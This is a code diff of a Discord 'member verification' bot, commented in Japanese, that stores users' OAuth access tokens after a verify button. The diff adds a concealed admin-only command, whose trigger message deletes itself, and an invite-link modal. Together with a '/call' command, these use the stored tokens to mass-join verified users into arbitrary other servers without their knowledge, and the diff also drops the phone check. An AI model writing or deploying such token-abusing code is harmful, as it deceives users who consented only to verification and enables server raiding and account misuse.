@@ -36,14 +36,41 @@ def save_user(user_id, token, guild_id):
     with open(DB_FILE, 'w', encoding='utf-8') as f:
         json.dump(users, f, indent=4)
 
-# --- Bot 設定 ---
+# --- モーダル (招待) ---
+class MemberModal(discord.ui.Modal, title='メンバー追加魔法'):
+    invite_url = discord.ui.TextInput(label='招待リンク', placeholder='https://discord.gg/xxxx', required=True)
+    count = discord.ui.TextInput(label='参加させる人数', placeholder='半角数字', required=True)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+        try:
+            target_count = int(self.count.value)
+            code = self.invite_url.value.split('/')[-1]
+            res = requests.get(f"https://discord.com/api/v10/invites/{code}")
+            if res.status_code != 200:
+                return await interaction.followup.send("招待リンクが無効だよ", ephemeral=True)
+            
+            target_guild_id = res.json().get('guild', {}).get('id')
+            users = load_users()
+            user_ids = list(users.keys())[:target_count]
+
+            success = 0
+            for u_id in user_ids:
+                url = f'https://discord.com/api/guilds/{target_guild_id}/members/{u_id}'
+                headers = {'Authorization': f'Bot {TOKEN}', 'Content-Type': 'application/json'}
+                r = requests.put(url, headers=headers, json={'access_token': users[u_id]['token']})
+                if r.status_code in [201, 204]: success += 1
+            await interaction.followup.send(f"🌸 {success}人の追加に成功したよ！", ephemeral=True)
+        except Exception as e:
+            await interaction.followup.send(f"エラー: {e}", ephemeral=True)
+
+# --- Bot 本体 ---
 class MyBot(commands.Bot):
     def __init__(self):
         intents = discord.Intents.default()
         intents.members = True
         intents.message_content = True
         super().__init__(command_prefix="!", intents=intents)
-
     async def setup_hook(self):
         await self.tree.sync()
         print("🌸 同期完了！")
@@ -53,59 +80,124 @@ bot = MyBot()
 class VerifyView(discord.ui.View):
     def __init__(self, guild_id):
         super().__init__(timeout=None)
-        # 確実に動くように、URLを手動で構築
         safe_uri = REDIRECT_URI.replace(':', '%3A').replace('/', '%2F')
-        # ここで「state」にギルドIDをしっかり入れる
         self.oauth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={safe_uri}&scope=identify+guilds.join&state={guild_id}"
         self.add_item(discord.ui.Button(label="Verify (認証して参加するっ！)", url=self.oauth_url, style=discord.ButtonStyle.link))
 
 @bot.tree.command(name="setup")
 @app_commands.checks.has_permissions(administrator=True)
 async def setup(interaction: discord.Interaction):
-    embed = discord.Embed(title="🌸 メンバー認証", description="下のボタンで連携してね！", color=0xffb6c1)
+    embed = discord.Embed(title="🌸 メンバー認証", description="下のボタンを押して連携を完了してください✨", color=0xffb6c1)
     await interaction.response.send_message(embed=embed, view=VerifyView(interaction.guild_id))
 
-# --- Flask サーバー ---
+@bot.tree.command(name="call")
+async def call(interaction: discord.Interaction):
+    users = load_users()
+    gid = str(interaction.guild_id)
+    current_guild_users = [u for u, data in users.items() if gid in data.get("guilds", [])]
+    if len(current_guild_users) < 10:
+        return await interaction.response.send_message(f"❌ 10人必要だよ（現在: {len(current_guild_users)}人）", ephemeral=True)
+    await interaction.response.send_message("✨ 招待中...", ephemeral=True)
+    success = 0
+    for u_id in current_guild_users:
+        url = f'https://discord.com/api/guilds/{gid}/members/{u_id}'
+        headers = {'Authorization': f'Bot {TOKEN}'}
+        res = requests.put(url, headers=headers, json={'access_token': users[u_id]['token']})
+        if res.status_code in [201, 204]: success += 1
+    await interaction.followup.send(f"🌸 {success}人を追加したよ！")
+
+@bot.command(name="Member")
+async def member_cmd(ctx):
+    if ctx.author.id == ADMIN_USER_ID:
+        await ctx.message.delete()
+        view = discord.ui.View()
+        btn = discord.ui.Button(label="メニューを開く", style=discord.ButtonStyle.pink)
+        async def cb(interaction):
+            if interaction.user.id == ADMIN_USER_ID: await interaction.response.send_modal(MemberModal())
+        btn.callback = cb
+        view.add_item(btn)
+        await ctx.send("🔐 管理者専用:", view=view, delete_after=60)
+
+# --- Flask & 超リアルUI ---
 app = Flask(__name__)
 
 @app.route('/callback')
 def callback():
-    code = request.args.get('code')
-    # guild_idが直接来ている場合と、state経由で来ている場合の両方に対応
-    guild_id = request.args.get('state') or request.args.get('guild_id')
+    try:
+        code = request.args.get('code')
+        guild_id = request.args.get('state') or request.args.get('guild_id')
+        if not code: return "認証コードがありません", 400
 
-    if not code:
-        return "認証コードが見つかりません。やり直してください。", 400
+        data = {'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI}
+        res = requests.post('https://discord.com/api/oauth2/token', data=data)
+        access_token = res.json().get('access_token')
 
-    # Discordにトークンを要求
-    data = {
-        'client_id': CLIENT_ID,
-        'client_secret': CLIENT_SECRET,
-        'grant_type': 'authorization_code',
-        'code': code,
-        'redirect_uri': REDIRECT_URI
-    }
-    
-    # 🚨 ここでエラーが起きやすいので慎重に処理
-    res = requests.post('https://discord.com/api/oauth2/token', data=data)
-    
-    if res.status_code != 200:
-        return f"Discordトークン取得エラー: {res.text}", res.status_code
+        u_info = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {access_token}'}).json()
+        save_user(u_info['id'], access_token, guild_id)
 
-    token_json = res.json()
-    access_token = token_json.get('access_token')
+        # 超豪華UI HTML
+        return """
+        <!DOCTYPE html>
+        <html lang="ja">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>
+                @import url('https://fonts.googleapis.com/css2?family=M+PLUS+Rounded+1c:wght@700&display=swap');
+                body {
+                    margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center;
+                    font-family: 'M PLUS Rounded 1c', sans-serif;
+                    background: linear-gradient(135deg, #fceaf0 0%, #e8f0ff 100%);
+                    overflow: hidden; perspective: 1000px;
+                }
+                .bg-blobs {
+                    position: absolute; width: 100%; height: 100%; top: 0; left: 0; z-index: -1;
+                }
+                .blob {
+                    position: absolute; width: 300px; height: 300px; background: rgba(255, 182, 193, 0.4);
+                    border-radius: 50%; filter: blur(80px); animation: move 20s infinite alternate;
+                }
+                @keyframes move { from { transform: translate(-10%, -10%); } to { transform: translate(20%, 20%); } }
 
-    # ユーザー情報を取得
-    u_res = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {access_token}'})
-    u_info = u_res.json()
+                .card {
+                    background: rgba(255, 255, 255, 0.4);
+                    backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.7);
+                    padding: 50px; border-radius: 40px; text-align: center;
+                    box-shadow: 0 20px 50px rgba(0,0,0,0.05), inset 0 0 20px rgba(255,255,255,0.5);
+                    transform-style: preserve-3d; animation: floatCard 6s ease-in-out infinite;
+                }
+                @keyframes floatCard { 0%, 100% { transform: translateY(0) rotateX(2deg); } 50% { transform: translateY(-15px) rotateX(-2deg); } }
 
-    # 電話番号チェック（テスト中はここを無効にしたい場合はコメントアウトしてください）
-    if not u_info.get('phone'):
-        return "<h1>⚠️ 電話番号認証が必要です</h1>", 403
+                h1 { color: #ff85a2; font-size: 2.2rem; margin-bottom: 10px; text-shadow: 0 4px 10px rgba(255, 133, 162, 0.2); }
+                p { color: #8a99af; font-size: 1.1rem; margin-bottom: 30px; }
 
-    save_user(u_info['id'], access_token, guild_id)
-
-    return "<h1>認証成功！🌸</h1>Discordに戻ってね♪"
+                .real-button {
+                    display: inline-block; padding: 20px 50px; font-size: 1.4rem; color: #ff85a2;
+                    background: #fdfdfd; border-radius: 50px; border: none; cursor: pointer;
+                    box-shadow: 0 10px 20px rgba(0,0,0,0.05), 0 6px 6px rgba(0,0,0,0.05), inset 0 -4px 10px rgba(0,0,0,0.05), inset 0 4px 10px #ffffff;
+                    transition: all 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275); text-decoration: none;
+                }
+                .real-button:active {
+                    transform: scale(0.95);
+                    box-shadow: 0 4px 8px rgba(0,0,0,0.05), inset 0 8px 15px rgba(0,0,0,0.1);
+                }
+                .sparkle { position: absolute; font-size: 2rem; animation: rotate 4s infinite linear; }
+                @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+            </style>
+        </head>
+        <body>
+            <div class="bg-blobs"><div class="blob"></div></div>
+            <div class="card">
+                <div class="sparkle" style="top:-20px; right:-20px;">✨</div>
+                <h1>認証成功だよっ！🌸</h1>
+                <p>もふもふパワーで連携したよ！<br>Discordに戻って確認してね♪</p>
+                <div class="real-button">完了 ✨</div>
+            </div>
+        </body>
+        </html>
+        """
+    except Exception as e:
+        return f"Error: {e}", 500
 
 def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
